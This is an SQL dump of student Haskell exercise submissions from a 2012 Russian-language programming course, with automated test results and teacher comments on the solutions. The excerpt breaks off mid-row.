(3583, 86, '374969', '2012-11-14 22:40:41', 2, 'allNondivisible []      = True\r\nallNondivisible (hd:tl) = (all (x -> mod x hd /= 0 && mod hd x /= 0) tl)&&(allNondivisible tl)  \r\n  --- Тут у вас (и у меня:) такая проблема - \r\n  --- у вас решение в принципе совершенно правильное, но не по условию (нет этого\r\n  --- приема "множество как функция", который мы проходили). И в то же время вы прислали ее \r\n  --- слишком поздно, чтобы я успел что-то подсказать, как обещал.\r\n  --- Мое предложение такое - я пока ее не засчитаю, но, если вы сделаете задачу 27-1 (с этим же приемом)\r\n  --- то пришлите снова и  22-2 (с приемом или без приема, все равно и я ее тоже засчитаю)\r\n  --- Про прием мы говорили и на последнем и на предпоследнем занятии, и, если вы посмотрите\r\n  --- примеры, то без труда все сделаете, я думаю. Но, если будут вопросы, пишите.', '<br/>Тесты успешно пройдены!'),
(3584, 87, '374969', '2012-11-14 22:46:44', 0, 'data Expr a = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\neval X = x -> x\r\neval N a = x -> a\r\neval (Add a b) = x -> eval a x + eval b x\r\neval (Mult a b) = x -> eval a x * eval b x', 'Не удалось вычислить выражение "eval (Add (N 3) (Mult X X)) 10", проверьте правильность синтаксиса'),
(3585, 87, '374969', '2012-11-14 22:48:19', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\neval X = x -> x\r\neval (N a) = x -> a\r\neval (Add a b) = x -> eval a x + eval b x\r\neval (Mult a b) = x -> eval a x * eval b x', '<br/>Тесты успешно пройдены!'),
(3586, 88, '374969', '2012-11-14 22:53:09', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = N 1\r\ndiff N _ = N 0\r\ndiff (Add a b) = Add (diff a) (diff b)\r\ndiff (Mult a b) = Add (Mult a (diff b)) (Mult (diff a) b)', 'Не удалось вычислить выражение "diff (Mult X X)", проверьте правильность синтаксиса'),
(3587, 88, '374969', '2012-11-14 22:54:05', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = N 1\r\ndiff (N _) = N 0\r\ndiff (Add a b) = Add (diff a) (diff b)\r\ndiff (Mult a b) = Add (Mult a (diff b)) (Mult (diff a) b)', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3588, 89, '374969', '2012-11-14 23:39:00', 1, '-- Старое решение через алгебру применить не смог =(\r\ndata Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\nfoldTree f Empty = f\r\nfoldTree f (Node a t1 t2) = a:(foldTree (foldTree f t2) t1)\r\n\r\nflatten tree = foldTree [] tree', '<br/>Тесты успешно пройдены!'),
(3589, 88, '374969', '2012-11-14 23:41:40', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = N 1\r\ndiff (N _) = N 0\r\ndiff (Add a b) = Add (diff a) (diff b)\r\ndiff (Mult a b) = Add (Mult (diff a) b) (Mult a (diff b))\r\n', '<br/>Тесты успешно пройдены!'),
(3590, 91, '214982', '2012-11-14 23:55:52', 1, 'merge [] y = y\r\nmerge x [] = x\r\nmerge (x:xs) (y:ys) = if x > y then y : (merge (x:xs) ys) else if y > x then x : merge xs (y:ys) else x:merge xs ys', '<br/>Тесты успешно пройдены!'),
(3591, 90, '214982', '2012-11-14 23:56:11', 1, 'findSameQQ x [] = []\r\nfindSameQQ x y = if (x == (head y)) then [x] else findSameQQ x (tail y)\r\n\r\nfindSame [] = []\r\nfindSame x = let z = findSameQQ (head x) (tail x) in if z == [] then findSame (tail x) else z', '<br/>Тесты успешно пройдены!'),
(3592, 89, '214982', '2012-11-14 23:57:51', 1, '{-- У меня смутное подозрение, что это тоже ++-}\r\n  --- Ну да, это вы просто переписали ++ и назвали иначе.. Но OK, это мы разберем.\r\ndata Tree x = Node x (Tree x) (Tree x) | Empty\r\n  \r\noneByOne [] y = y\r\noneByOne x y = (head x):oneByOne (tail x) y\r\n\r\nflatten (Node x Empty right) = x:(flatten right)\r\nflatten (Node x right Empty) = x:(flatten right)\r\nflatten (Node x left right) = x:(oneByOne (flatten left) (flatten right))\r\nflatten Empty = []\r\n', '<br/>Тесты успешно пройдены!'),
(3593, 87, '214982', '2012-11-14 23:58:38', 1, 'data Expr = N Integer | X | Add Expr Expr | Mult Expr Expr\r\n\r\neval X x = x\r\neval (Add left right) x = eval left x + eval right x\r\neval (Mult left right) x = (eval left x) * (eval right x)\r\neval (N e) x = e  ', '<br/>Тесты успешно пройдены!'),
(3594, 88, '214982', '2012-11-14 23:58:59', 1, 'data Expr = N Integer | X | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff (Mult left right) = (Add (Mult (diff left) right) (Mult left (diff right)))\r\ndiff (Add left right) = (Add (diff left) (diff right))\r\ndiff X = (N 1) \r\ndiff (N x) = (N 0)', '<br/>Тесты успешно пройдены!'),
(3595, 90, '374969', '2012-11-14 23:59:35', 1, 'findSame [] = Nothing\r\nfindSame (hd:tl) = if (any (x -> x==hd) tl) then Just hd else findSame tl', '<br/>Тесты успешно пройдены!'),
(3596, 85, '374969', '2012-11-15 00:05:54', 2, '  --- Ну все-таки это сильно не доделано(( Надо было еще определить <, == и show\r\ndata Ration = Rat Integer Integer\r\n\r\nplusRation (Rat a b) (Rat c d) = Rat (a*d+b*c) (b*d)\r\n\r\ninstance Num Ration where\r\n	x + y = plusRation x y\r\n', 'Не удалось вычислить выражение "Rat 1 2 + Rat 1 7", проверьте правильность синтаксиса'),
(3597, 91, '51559263', '2012-11-15 01:05:14', 1, 'merge [] xs = xs\r\n\r\n\r\n\r\nmerge xs [] = xs\r\n\r\n\r\n\r\nmerge ( x : xs ) ( y : ys ) = if x > y\r\n\r\n                              then y : merge ( x : xs ) ys\r\n\r\n							  else if x /= y\r\n\r\n							       then x : merge xs ( y : ys )\r\n\r\n								   else x : merge xs ys\r\n', '<br/>Тесты успешно пройдены!'),
(3598, 87, '532002', '2012-11-15 04:08:22', 1, 'data Expr = X| N Int| Add Expr Expr| Mult Expr Expr\r\n\r\neval (N t) x = t\r\n\r\neval (Add a b) x = (eval a x)+ (eval b x)\r\n\r\neval (Mult a b) x = (eval a x)*(eval b x)\r\n\r\neval y x = x\r\n', '<br/>Тесты успешно пройдены!'),
(3599, 88, '532002', '2012-11-15 04:21:20', 1, 'data Expr = X| N Int| Add Expr Expr| Mult Expr Expr deriving Show\r\n\r\ndiff (N t) = N 0\r\n\r\ndiff (Add a b) = Add (diff a) (diff b)\r\n\r\ndiff (Mult a b) = Add (Mult (diff a) b) (Mult a (diff b))\r\n\r\ndiff x =N 1\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3600, 87, '318210', '2012-11-15 06:39:49', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\neval (X) i = i\r\neval (N i) _ = i\r\n\r\neval (Add e1 e2) i = eval e1 i + eval e2 i\r\neval (Mult e1 e2) i = eval e1 i * eval e2 i\r\n', '<br/>Тесты успешно пройдены!'),
(3601, 88, '318210', '2012-11-15 06:55:44', 0, 'data Expr = X | \r\n	    N Integer | \r\n    	    Add Expr Expr | \r\n	    Mult Expr Expr\r\n	    deriving Show\r\n\r\ndiff (X) = (N 1)\r\ndiff (N i) = (N 0)\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2) \r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult (diff e2) e1)', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3602, 88, '318210', '2012-11-15 06:56:42', 1, 'data Expr = X | \r\n	    N Integer | \r\n    	    Add Expr Expr | \r\n	    Mult Expr Expr\r\n	    deriving Show\r\n\r\ndiff (X) = (N 1)\r\ndiff (N i) = (N 0)\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2) \r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2) )', '<br/>Тесты успешно пройдены!'),
(3603, 86, '318210', '2012-11-15 07:29:27', 2, 'allNondivisible (x:xs) =  allNondivisible1 (x:xs) []\r\n\r\nisDiv a [] = False\r\nisDiv a (x:xs) 	| ( a * x == 0 && a + x /= 0) = True\r\n		|  a * x == 0 = False\r\n		| a `mod` x == 0  || x `mod` a == 0 = True\r\n		| otherwise = isDiv a xs\r\n\r\nallNondivisible1 [] y = True\r\nallNondivisible1 (x:xs) y | isDiv x y == True = False\r\n			| otherwise = allNondivisible1 (xs) (x:y)\r\n\r\nallNondivisible []      = True\r\nallNondivisible (hd:tl) = (all (x -> mod x hd /= 0 && mod hd x /= 0) tl)&&(allNondivisible tl)  \r\n  --- Тут у вас (и у меня:) такая проблема - \r\n  --- у вас решение в принципе совершенно правильное, но не по условию (нет этого\r\n  --- приема "множество как функция", который мы проходили). И в то же время вы прислали ее \r\n  --- слишком поздно, чтобы я успел что-то подсказать, как обещал.\r\n  --- Мое предложение такое - я пока ее не засчитаю, но, если вы сделаете задачу 27-1 (с этим же приемом)\r\n  --- то пришлите снова и  22-2 (с приемом или без приема, все равно и я ее тоже засчитаю)\r\n  --- Про прием мы говорили и на последнем и на предпоследнем занятии, и, если вы посмотрите\r\n  --- примеры, то без труда все сделаете, я думаю. Но, если будут вопросы, пишите.', '<br/>Тесты успешно пройдены!'),
(3604, 85, '442421', '2012-11-15 08:03:17', 0, '\r\ndata Ration = Rat Integer Integer\r\n\r\ninstance Show Ration where\r\n	show (Rat a b) = show a ++ "/" ++ show b\r\n\r\ninstance Eq Ration where\r\n  (Rat a b) == (Rat n m)   =    a*m == b*n\r\n\r\ninstance Ord Ration where\r\n  (Rat a b) < (Rat n m)    =    a*m < b*n\r\n\r\ninstance Num Ration where\r\n   (Rat a b) + (Rat n m)   =    (Rat (a*m+n*b) (b*m) ) ', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3605, 85, '442421', '2012-11-15 08:05:47', 0, '\r\ndata Ration = Rat Integer Integer\r\n\r\ninstance Show Ration where\r\n	show (Rat a b) = show a ++ "/" ++ show b\r\n\r\ninstance Eq Ration where\r\n  (Rat a b) == (Rat n m)   =    (a*m == b*n) && (a*b*n*m>=0)\r\n\r\ninstance Ord Ration where\r\n  (Rat a b) < (Rat n m)    =    a*m < b*n && (a*b*n*m>=0)\r\n\r\ninstance Num Ration where\r\n   (Rat a b) + (Rat n m)   =    (Rat (a*m+n*b) (b*m) ) ', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3606, 85, '442421', '2012-11-15 08:12:54', 1, 'data Ration = Rat Integer Integer\r\n\r\ninstance Show Ration where\r\n	show (Rat a b) = show a ++ "/" ++ show b\r\n\r\ninstance Eq Ration where\r\n  (Rat a b) == (Rat n m)   =    (a*m == b*n) && (a*b*n*m>=0)\r\n\r\ninstance Ord Ration where\r\n  (Rat a b) < (Rat n m)    =    if a*b>=0 then abs a*m < abs b*n && n*m>=0 else abs a*m > abs b*n || n*m>=0 \r\n\r\ninstance Num Ration where\r\n   (Rat a b) + (Rat n m)   =    (Rat (a*m+n*b) (b*m) ) ', '<br/>Тесты успешно пройдены!'),
(3607, 93, '83813', '2012-11-15 08:15:09', 1, 'import Data.List\r\n\r\n-- all three''s degrees of length not more than n\r\n\r\nthrees n = sort $ [s | i <- [0..3 * n], let s = show (3^i), length s <= n]\r\n\r\ngetIthHam n = [v | s <- threes n, let x = read s, let v = x * 10^(n - length s)]\r\n\r\nham = concat [getIthHam i | i <- [1..]]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3608, 89, '83813', '2012-11-15 08:23:33', 1, 'data Node = Node Integer Node Node | Empty\r\n\r\n\r\n\r\nflattenInt :: Node -> [Integer] -> [Integer]\r\n\r\nflattenInt Empty xs = xs\r\n\r\nflattenInt (Node val left right) xs = val : (flattenInt left (flattenInt right xs))\r\n\r\n\r\n\r\nflatten :: Node -> [Integer]\r\n\r\nflatten a = flattenInt a []\r\n\r\n--flatten Empty = []\r\n\r\n--flatten (Node val left right) = [val] ++ flatten left ++ flatten right\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3609, 86, '442421', '2012-11-15 08:26:33', 2, '\r\nnonDivisible a b =  (mod a b /= 0) && (mod b a /= 0)\r\n\r\nallNondivisible x = length [(a,b)| a<-x, b<-x, a/=b, nonDivisible a b] == (length [(a,b)| a<-x, b<-x, a/=b])\r\n\r\nallNondivisible []      = True\r\nallNondivisible (hd:tl) = (all (x -> mod x hd /= 0 && mod hd x /= 0) tl)&&(allNondivisible tl)  \r\n  --- Тут у вас (и у меня:) такая проблема - \r\n  --- у вас решение в принципе совершенно правильное, но не по условию (нет этого\r\n  --- приема "множество как функция", который мы проходили). И в то же время вы прислали ее \r\n  --- слишком поздно, чтобы я успел что-то подсказать, как обещал.\r\n  --- Мое предложение такое - я пока ее не засчитаю, но, если вы сделаете задачу 27-1 (с этим же приемом)\r\n  --- то пришлите снова и  22-2 (с приемом или без приема, все равно и я ее тоже засчитаю)\r\n  --- Про прием мы говорили и на последнем и на предпоследнем занятии, и, если вы посмотрите\r\n  --- примеры, то без труда все сделаете, я думаю. Но, если будут вопросы, пишите.', '<br/>Тесты успешно пройдены!'),
(3610, 90, '83813', '2012-11-15 08:31:18', 1, 'findSame [] = Nothing\r\n\r\nfindSame (x:xs) = if (x `elem` xs) then Just x else findSame xs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3611, 91, '83813', '2012-11-15 08:34:40', 1, 'merge xs [] = xs\r\n\r\nmerge [] ys = ys\r\n\r\nmerge (x:xs) (y:ys) =\r\n\r\n  if (x == y) then\r\n\r\n    x : (merge xs ys)\r\n\r\n  else if (x <= y) then\r\n\r\n    x : (merge xs (y:ys))\r\n\r\n  else\r\n\r\n    y : (merge (x:xs) ys)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3612, 91, '442421', '2012-11-15 08:36:23', 0, '\r\nmerge [] y = y\r\nmerge x [] = x\r\n\r\nmerge (x:xs) y = doMerge (x:xs) (break (x<) y) \r\n\r\ndoMerge x (f,s) = f ++ merge s x ', 'Выражение имеет неправильное значение: merge [1,4,8] [2,4,5,10,20]'),
(3613, 91, '442421', '2012-11-15 08:49:52', 1, 'merge [] y = y\r\nmerge x [] = x\r\n\r\nmerge (x:xs) y = doMerge (x:xs) (break (x<=) y) \r\n\r\ndoMerge x (f,[]) = f ++ x\r\ndoMerge (x:xs) (f,(s:ss)) = if x==s \r\n			then f ++ merge ss (x:xs) \r\n			else f ++ merge (s:ss) (x:xs)\r\n', '<br/>Тесты успешно пройдены!'),
(3614, 89, '442421', '2012-11-15 09:04:18', 1, 'data Tree=Empty|Node Integer Tree Tree deriving Show\r\n\r\nflatten Empty = []\r\n\r\nflatten (Node a l r) = [a] ++ (flatten l) ++ (flatten r)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3615, 93, '355679', '2012-11-15 09:22:05', 1, 'import Debug.Trace\r\n\r\n--- OK, очень хорошо, но, на самом деле, раз вы догадались использовать merge,\r\n--- то остальное можно записать гораздо короче, буквально в одну строку.\r\n--- Мы это обсудим. \r\n\r\nmerge (x1:list1) (x2:list2) = let {\r\n\r\n		x = min x1 x2;\r\n\r\n		newList1 = if x1 == x then list1 else x1:list1;\r\n\r\n		newList2 = if x2 == x then list2 else x2:list2;\r\n\r\n	} in (\r\n\r\n		x : (merge newList1 newList2)\r\n\r\n	)\r\n\r\n\r\n\r\nmerge xs [] = xs\r\n\r\nmerge _ xs = xs\r\n\r\n\r\n\r\n\r\n\r\nham'' prev prevDeg3 prevDeg10 = let {\r\n\r\n		multBy10 = map (*10) prev;\r\n\r\n		newDeg10 = prevDeg10 * 10;\r\n\r\n		threes'' prev = let {\r\n\r\n				new = prev * 3;\r\n\r\n			} in (\r\n\r\n				if (new < newDeg10) then new:(threes'' new) else []\r\n\r\n			);\r\n\r\n		threes = threes'' prevDeg3;\r\n\r\n		newDeg3 = last threes;\r\n\r\n		new = merge multBy10 threes;\r\n\r\n	} in (\r\n\r\n		prev ++ (ham'' new newDeg3 newDeg10)\r\n\r\n	)\r\n\r\n\r\n\r\nham = ham'' [1] 1 1\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3616, 85, '83813', '2012-11-15 09:24:42', 0, '--import qualified Prelude as P\n\ndata Rat = Rat Integer Integer\n\n\n\nplusRat :: Rat -> Rat -> Rat\n\nplusRat (Rat a b) (Rat c d) = Rat (a * d + b * c) (b * d)\n\n\n\ninstance Show Rat where\n\n  show (Rat a b) = show a ++ "/" ++ (show b)\n\n\n\ninstance Eq Rat where\n\n  (Rat a b) == (Rat c d) = a * d == b * c\n\n\n\ninstance Ord Rat where\n\n  (Rat a b) < (Rat c d) = a * d < b * c\n\n\n\ninstance Num Rat where\n\n  (Rat a b) + (Rat c d) = plusRat (Rat a b) (Rat c d)\n\n\n\n\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3617, 85, '83813', '2012-11-15 09:29:42', 0, '--import qualified Prelude as P\n\ndata Rat = Rat Integer Integer\n\n\n\nnormRat (Rat a b) = Rat (signum (a * b) * (abs a)) (abs b)\n\n\n\nplusRat :: Rat -> Rat -> Rat\n\nplusRat (Rat a b) (Rat c d) = normRat $ Rat (a * d + b * c) (b * d)\n\n\n\ninstance Show Rat where\n\n  show (Rat c d) = let (Rat a b) = normRat (Rat c d) in show a ++ "/" ++ (show b)\n\n\n\ninstance Eq Rat where\n\n  (Rat a b) == (Rat c d) = a * d == b * c\n\n\n\ninstance Ord Rat where\n\n  (Rat a b) < (Rat c d) = a * d < b * c\n\n\n\ninstance Num Rat where\n\n  (Rat a b) + (Rat c d) = plusRat (Rat a b) (Rat c d)\n\n\n\n\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3618, 90, '442421', '2012-11-15 09:30:40', 1, '--возвращает пару 1-ответ 2-сколько еще чисел встречающихся столько же раз\r\nfindSame x = findSame'' [] x\r\n\r\n\r\nfindSame'' r [] = getResult r\r\nfindSame'' r (x:xs) = findSame'' ( ((length (filter (x==) xs) + 1),x) :r) (filter (x/=) xs)\r\n\r\n\r\ngetMax x = maximum (map ((a,b)->a) x)\r\n\r\ngetResult x = getResult'' x (getMax x) \r\n\r\ngetResult'' x m = (snd(head (filter ((a,b)->a==m) x)), foldl (\r\n (a,b)-> if m==a then n+1 else n) 0 x)', '<br/>Тесты успешно пройдены!'),
(3619, 85, '83813', '2012-11-15 09:32:01', 1, 'ч--import qualified Prelude as P\r\n\r\ndata Rat = Rat Integer Integer\r\n\r\n\r\n\r\nnormRat (Rat a b) = Rat (signum (a * b) * (abs a)) (abs b)\r\n\r\n\r\n\r\nplusRat :: Rat -> Rat -> Rat\r\n\r\nplusRat (Rat a b) (Rat c d) = normRat $ Rat (a * d + b * c) (b * d)\r\n\r\n\r\n\r\ninstance Show Rat where\r\n\r\n  show (Rat c d) = let (Rat a b) = normRat (Rat c d) in show a ++ "/" ++ (show b)\r\n\r\n\r\n\r\ninstance Eq Rat where\r\n\r\n  (Rat a b) == (Rat c d) = a * d == b * c\r\n\r\n\r\n\r\ninstance Ord Rat where\r\n\r\n  (Rat a1 b1) < (Rat c1 d1) = let { (Rat a b) = normRat (Rat a1 b1);\r\n\r\n                                    (Rat c d) = normRat (Rat c1 d1) } in a * d < b * c\r\n\r\n\r\n\r\ninstance Num Rat where\r\n\r\n  (Rat a b) + (Rat c d) = plusRat (Rat a b) (Rat c d)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3620, 86, '214982', '2012-11-15 09:37:03', 0, '{-- Честно говоря, я не до конца понял этот прием, и писал задачку из объяснения мне на другом примере, просто переделав его, постараюсь к зачету вникнуть.-}\r\n\r\nf (x:xs) cond  = if not (cond x) then False else f xs (	 -> cond t && mod x t /= 0 && mod t x /= 0)\r\nf [] cond = True\r\n\r\nallNonDivisible x = f x (	 -> True)  ', 'Не удалось вычислить выражение "allNondivisible [2, 7, 6, 5]", проверьте правильность синтаксиса'),
(3621, 86, '214982', '2012-11-15 09:37:48', 1, '{-- Честно говоря, я не до конца понял этот прием, и писал задачку из объяснения мне на другом примере, просто переделав его, постараюсь к зачету вникнуть.-}\r\n   --- OK) В этот раз еще одна простая похожая задача, так что может и раньше вникнете)\r\nf (x:xs) cond  = if not (cond x) then False else f xs (	 -> cond t && mod x t /= 0 && mod t x /= 0)\r\nf [] cond = True\r\n\r\nallNondivisible x = f x (	 -> True)  ', '<br/>Тесты успешно пройдены!'),
(3622, 97, '355679', '2012-11-15 11:34:45', 1, 'import qualified Data.Map as Map\r\n\r\nimport qualified Data.Maybe as Maybe\r\n\r\n\r\n\r\nbrackets = Map.fromList [(''('', '')''), (''['', '']'')] \r\n\r\n\r\n\r\nisClosingBracket ch = elem ch (Map.elems brackets)\r\n\r\nisOpeningBracket ch  = elem ch (Map.keys brackets)\r\n\r\nisBracket ch = isOpeningBracket ch || isClosingBracket ch\r\n\r\ngetBracket ch = Maybe.fromJust (Map.lookup ch brackets)\r\n\r\n\r\n\r\ncheckBrackets'' [] [] = True\r\n\r\ncheckBrackets'' [] _ = False\r\n\r\ncheckBrackets'' (ch:str) bracketStack =\r\n\r\n	if isBracket ch then\r\n\r\n		if isOpeningBracket ch then\r\n\r\n			checkBrackets'' str (ch:bracketStack)\r\n\r\n		else if (isClosingBracket ch) &&\r\n\r\n				(length bracketStack /= 0) &&\r\n\r\n				(getBracket (head bracketStack) == ch) then\r\n\r\n			checkBrackets'' str (tail bracketStack)\r\n\r\n		else\r\n\r\n			False\r\n\r\n	else\r\n\r\n		checkBrackets'' str bracketStack\r\n\r\n\r\n\r\ncheckBrackets str = checkBrackets'' str []\r\n\r\n\r\n\r\ntest = (checkBrackets "[()[]]()") && not(checkBrackets "([)]" || checkBrackets "())[]" || checkBrackets "([]")\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3623, 95, 'code', '2012-11-15 15:42:06', 1, 'public static bool allDiffrent(int[] a)\r\n{\r\n  if (a.Count() > 1)\r\n  {\r\n    return allDifferent1(a, 0, t => true);\r\n  }\r\n  else\r\n  {\r\n    return true;\r\n  }\r\n}\r\npublic static bool allDifferent1(int[] a, int from, Predicate<int> cond)\r\n  {\r\n  if(from==a.Length-1)\r\n  {\r\n  return cond(a[from]);\r\n  }\r\n  from++;\r\n  return allDifferent1(a, from, t => a[from] != a[from - 1] && cond(t));\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3624, 89, '3431532', '2012-11-15 16:21:22', 2, 'data Node = Empty\r\n            | Node Int Node Node\r\n\r\nflatten (Empty) = []\r\n\r\nflatten (Node x l r) = [x] ++ (flatten l) ++ (flatten r)\r\n  --- Это к сожалению слишком существенно позже срока - задачи к четвергу надо присылать не позже 13:40 ', '<br/>Тесты успешно пройдены!'),
(3625, 97, '97440347', '2012-11-15 17:45:43', 1, '   --- OK, очень хорошо.\r\n   --- Но, просто как замечание, есть гораздо более эффективное решение, мы его разберем\r\ncheckBrackets (x:xs) = iter 1 (length (x:xs)) (x:xs)\r\niter i n [] = True\r\niter i n (xs)\r\n		|(i<n) = iter (i+1) n (del_pairs [] (xs))\r\n		|(i==n) = if ((length xs) == 0)\r\n				  then True\r\n				  else False\r\ndel_pairs (zs) [] = (zs)\r\ndel_pairs (zs) [x] = zs++[x]\r\ndel_pairs (zs) (x:y:xs)\r\n		|((x==''('')&&(y=='')''))||((x==''['')&&(y=='']'')) = del_pairs (zs) (xs)\r\n		|not ((x==''('')&&(y=='')''))||((x==''['')&&(y=='']'')) = del_pairs (zs++[x]) (y:xs)', '<br/>Тесты успешно пройдены!'),
(3626, 90, '550896', '2012-11-15 18:38:08', 2, 'findSame :: [Int] -> Int\r\nfindSame a = findSame0 [] a\r\n\r\nfindSame0 :: [Int] -> [Int] -> Int\r\nfindSame0 acc [] = -1\r\nfindSame0 acc a | contains acc (head a) = head a\r\nfindSame0 acc a = findSame0 ((head a):acc) (tail a)\r\n\r\ncontains :: [Int] -> Int -> Bool\r\ncontains [] e = False\r\ncontains a e | head a == e = True\r\ncontains a e = contains (tail a) e\r\n  --- Это к сожалению слишком существенно позже крайнего срока.\r\n  --- Задачи к четвергу надо присылать не позже 13:40', '<br/>Тесты успешно пройдены!'),
(3627, 98, '550896', '2012-11-15 19:40:46', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a) deriving Show \r\n\r\n\r\n\r\ntoStr :: Tree Char -> [Char]\r\n\r\ntoStr Empty = [''e'']  \r\n\r\ntoStr (Node c left right) = [c, ''(''] ++ (toStr left) ++ ['')'', ''[''] ++ \r\n\r\n  (toStr right) ++ ['']'']\r\n\r\n\r\n\r\nfromStr :: [Char] -> Tree Char\r\n\r\nfromStr a | null a || head a == ''e'' = Empty \r\n\r\nfromStr a | (head a) == ''a'' || (head a) == ''b'' = \r\n\r\n  Node (head a) (fromStr (getLeft (tail a))) (fromStr (getRight (tail a)))\r\n\r\n\r\n\r\n\r\n\r\ngetLeft :: [Char] -> [Char]\r\n\r\ngetLeft [] = []\r\n\r\ngetLeft c = getLeft0 c [] 0    \r\n\r\n            \r\n\r\ngetLeft0 :: [Char] -> [Char] -> Int -> [Char]\r\n\r\ngetLeft0 c a 1 | head c == '')'' = a  \r\n\r\ngetLeft0 c a 0 | head c == ''('' = getLeft0 (tail c) a 1 \r\n\r\ngetLeft0 c a i | head c == ''('' = getLeft0 (tail c) (a++[head c]) (i + 1)    \r\n\r\ngetLeft0 c a i | head c == '')'' = getLeft0 (tail c) (a++[head c]) (i - 1)        \r\n\r\ngetLeft0 c a i  = getLeft0 (tail c) (a++[head c]) i     \r\n\r\n    \r\n\r\ngetRight :: [Char] -> [Char]\r\n\r\ngetRight [] = []\r\n\r\ngetRight c = getRight0 (dropToRight c) [] 0 \r\n\r\n    \r\n\r\ngetRight0 :: [Char] -> [Char] -> Int -> [Char]\r\n\r\ngetRight0 c a 1 | head c == '']'' = a\r\n\r\ngetRight0 c a 0 | head c == ''['' = getRight0 (tail c) a 1     \r\n\r\ngetRight0 c a i | head c == ''['' = getRight0 (tail c) (a++[head c]) (i + 1)     \r\n\r\ngetRight0 c a i | head c == '']'' = getRight0 (tail c) (a++[head c]) (i - 1)            \r\n\r\ngetRight0 c a i = getRight0 (tail c) (a++[head c]) i      \r\n\r\n    \r\n\r\ndropToRight :: [Char] -> [Char] \r\n\r\ndropToRight [] = []\r\n\r\ndropToRight a = dropToRight0 (tail a) 1\r\n\r\n\r\n\r\ndropToRight0 :: [Char] -> Int -> [Char]\r\n\r\ndropToRight0 [] i = []\r\n\r\ndropToRight0 a 0 = a\r\n\r\ndropToRight0 a i | (head a) == ''('' = dropToRight0 (tail a) (i + 1)\r\n\r\ndropToRight0 a i | (head a) == '')'' = dropToRight0 (tail a) (i - 1)\r\n\r\ndropToRight0 a i  = dropToRight0 (tail a) i\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3628, 97, '51559263', '2012-11-15 22:45:20', 0, 'cB xs = foldr (  c (a,b) -> if c == ''(''\r\n\n                             then (a+1,b)\r\n\n                             else if c == ''[''\r\n\n							      then (a,b+1)\r\n\n								  else if c == '')''\r\n\n								       then (a-1,b)\r\n\n								       else if c == '']''\r\n\n                                            then (a,b-1)\r\n\n                                            else (a,b) )\r\n\n              (0,0)\r\n\n              xs			  \r\n\n\r\n\ncheckBrackets xs = cB xs == (0,0)\n', 'Выражение имеет неправильное значение: checkBrackets [''('',''['','')'','']'']'),
(3629, 97, '51559263', '2012-11-15 23:38:30', 0, 'cB bs = foldr (  c xs -> let \r\n\n                              curr = head xs\r\n\n						  in\r\n\n                             if c == ''(''\r\n\n                             then (fst curr + 1,snd curr) : xs \r\n\n                             else if c == ''[''\r\n\n							      then (fst curr,snd curr + 1) : xs\r\n\n							      else if c == '')''\r\n\n								       then (fst curr - 1,snd curr) : xs\r\n\n								       else if c == '']''\r\n\n                                            then (fst curr,snd curr - 1) : xs\r\n\n                                             else xs )\r\n\n              [(0,0)]\r\n\n              bs			  \r\n\n\r\n\ncheckBrackets [] = True\r\n\n			  \r\n\ncheckBrackets xs = let \r\n\n                       pairs = cB xs\r\n\n				   in\r\n\n					   ( head pairs == (0,0) ) && \r\n\n					   length ( filter ( == 0 ) ( map (fst) pairs ) ) /= length ( filter ( == 0 ) ( map (snd) pairs ) )\n', 'Выражение имеет неправильное значение: checkBrackets [''('','')'',''['','']'']'),
(3630, 97, '51559263', '2012-11-16 01:54:52', 2, '  --- Что-то не совсем то..\r\n  --- Даже такой простой пример checkBrackets ")(" дает True\r\n  --- (Сейчас добавлю его в тесты)\r\n  \r\ncB bs = foldr (  c xs -> let \r\n\r\n                              curr = head xs\r\n\r\n						  in\r\n\r\n                             if c == ''(''\r\n\r\n                             then (fst curr + 1,snd curr) : xs \r\n\r\n                             else if c == ''[''\r\n\r\n							      then (fst curr,snd curr + 1) : xs\r\n\r\n							      else if c == '')''\r\n\r\n								       then (fst curr - 1,snd curr) : xs\r\n\r\n								       else if c == '']''\r\n\r\n                                            then (fst curr,snd curr - 1) : xs\r\n\r\n                                             else xs )\r\n\r\n              [(0,0)]\r\n\r\n              bs			  \r\n\r\n\r\n\r\nexpressions xs = let \r\n\r\n                     lst = foldr (  (a,b) (e : exprs) -> if a == 0 && b == 0 && e /= []\r\n\r\n                                                          then [(0,0)] : ( ((0,0) : e) : exprs )\r\n\r\n						     	         				  else ( (a,b) : e ) : exprs )\r\n\r\n 	                             [[]]\r\n\r\n					             xs\r\n\r\n                 in\r\n\r\n				     if head xs /= 